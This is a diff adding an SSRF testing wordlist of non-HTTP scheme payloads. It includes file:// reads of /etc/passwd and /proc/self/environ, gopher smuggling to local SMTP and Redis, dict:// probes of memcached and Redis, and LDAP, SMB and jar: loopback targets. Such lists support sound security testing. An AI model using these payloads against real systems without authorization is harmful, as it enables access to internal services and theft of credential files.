@@ -1,0 +1,47 @@
+# Non-HTTP schemes for SSRF testing
+
+# File protocol (local file access)
+file:///etc/passwd
+file:///c:/windows/win.ini
+file:///etc/hosts
+file:///proc/self/environ
+file://localhost/etc/passwd
+
+# Gopher protocol (protocol smuggling)
+gopher://127.0.0.1:80/_GET / HTTP/1.1
+gopher://localhost:25/_MAIL%20FROM:test@example.com
+gopher://127.0.0.1:6379/_INFO
+
+# FTP protocol
+ftp://127.0.0.1
+ftp://localhost
+ftp://internal.server
+
+# Dict protocol
+dict://127.0.0.1:11211/stat
+dict://localhost:6379/info
+
+# SFTP protocol
+sftp://127.0.0.1
+sftp://localhost
+
+# TFTP protocol
+tftp://127.0.0.1
+tftp://localhost
+
+# LDAP protocol
+ldap://127.0.0.1
+ldap://localhost:389
+
+# SMB/CIFS (Windows)
+\\\\127.0.0.1\\c$
+\\\\localhost\\share
+
+# Data URI (base64 encoded)
+data:text/html,<script>alert('SSRF')</script>
+data:text/plain;base64,SGVsbG8gV29ybGQ=
+
+# Jar protocol (Java)
+jar:http://127.0.0.1!/
+jar:file:///etc/passwd!/
+
